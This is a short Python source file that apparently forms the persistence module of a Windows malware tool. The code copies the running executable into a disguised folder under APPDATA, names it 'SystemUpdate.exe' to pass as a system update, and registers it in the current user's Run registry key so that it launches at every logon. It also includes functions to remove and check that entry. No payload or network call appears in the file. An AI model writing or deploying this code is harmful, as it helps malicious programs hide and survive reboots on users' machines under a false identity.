import os
import sys
import winreg
import shutil
from pathlib import Path

class PersistenceManager:
    # Manage startup persistence via registry 
    
    def __init__(self, app_name="SystemUpdate"):
        self.app_name = app_name
        self.reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
    def add_to_startup(self, executable_path=None):
        # Add program to Windows startup registry 
        try:
            if executable_path is None:
                executable_path = sys.executable
                
            # Copy to hidden location
            appdata = os.environ.get('APPDATA', '')
            hidden_dir = os.path.join(appdata, 'Microsoft', 'Windows', 'SystemUpdates')
            os.makedirs(hidden_dir, exist_ok=True)
            
            # Copy executable
            dest_path = os.path.join(hidden_dir, f"{self.app_name}.exe")
            if os.path.exists(executable_path) and executable_path != dest_path:
                try:
                    shutil.copy2(executable_path, dest_path)
                except:
                    dest_path = executable_path
            
            # Add to registry
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.reg_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, self.app_name, 0, winreg.REG_SZ, f'"{dest_path}"')
            winreg.CloseKey(key)
            
            return True, f"Added to startup: {dest_path}"
        except Exception as e:
            return False, f"Failed to add startup: {str(e)}"
    
    def remove_from_startup(self):
        # Remove program from Windows startup 
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.reg_path, 0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(key, self.app_name)
            except:
                pass
            winreg.CloseKey(key)
            
            # Remove hidden copy
            appdata = os.environ.get('APPDATA', '')
            hidden_path = os.path.join(appdata, 'Microsoft', 'Windows', 'SystemUpdates', f"{self.app_name}.exe")
            if os.path.exists(hidden_path):
                try:
                    os.remove(hidden_path)
                except:
                    pass
                    
            return True, "Removed from startup"
        except Exception as e:
            return False, f"Failed to remove: {str(e)}"
    
    def check_startup(self):
        # Check if program is in startup 
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.reg_path, 0, winreg.KEY_READ)
            try:
                value, _ = winreg.QueryValueEx(key, self.app_name)
                winreg.CloseKey(key)
                return True, value
            except:
                winreg.CloseKey(key)
                return False, "Not in startup"
        except:
            return False, "Cannot read registry"